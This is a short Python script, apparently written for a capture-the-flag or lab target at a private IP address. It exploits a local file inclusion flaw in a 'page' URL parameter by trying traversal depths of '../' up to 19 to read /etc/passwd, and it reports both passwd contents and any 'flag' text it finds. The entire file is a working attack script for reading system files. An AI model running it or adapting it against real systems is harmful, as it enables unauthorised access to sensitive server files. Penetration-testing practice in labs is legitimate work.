import requests

BASE_URL = "http://10.11.200.35"
PAGE_PARAM = "?page="

def test_lfi(depth):
    """Test Local File Inclusion with various directory traversal depths"""
    # Build the path traversal string
    traversal = "../" * depth + "etc/passwd"
    url = f"{BASE_URL}{PAGE_PARAM}{traversal}"

    print(f"Testing depth {depth}: {url}")

    try:
        response = requests.get(url, timeout=5)

        # Check if response contains 'flag' keyword
        if 'flag' in response.text.lower():
            print(f"\n{'='*70}")
            print(f"FLAG FOUND at depth {depth}!")
            print(f"URL: {url}")
            print(f"{'='*70}")
            return True

        # Check if we successfully read /etc/passwd
        if 'root:' in response.text or 'daemon:' in response.text:
            print(f"  → Successfully read /etc/passwd at depth {depth}")
            print(f"  → But no flag found yet, continuing...")
        else:
            print(f"  → No access at depth {depth}")

    except Exception as e:
        print(f"  → Error: {e}")

    return False

if __name__ == "__main__":
    print("Starting Local File Inclusion (LFI) test...")
    print(f"Target: {BASE_URL}")
    print(f"File: /etc/passwd\n")

    # Try different depths of directory traversal
    for depth in range(1, 20):
        if test_lfi(depth):
            break
    else:
        print("\nNo flag found after testing all depths.")
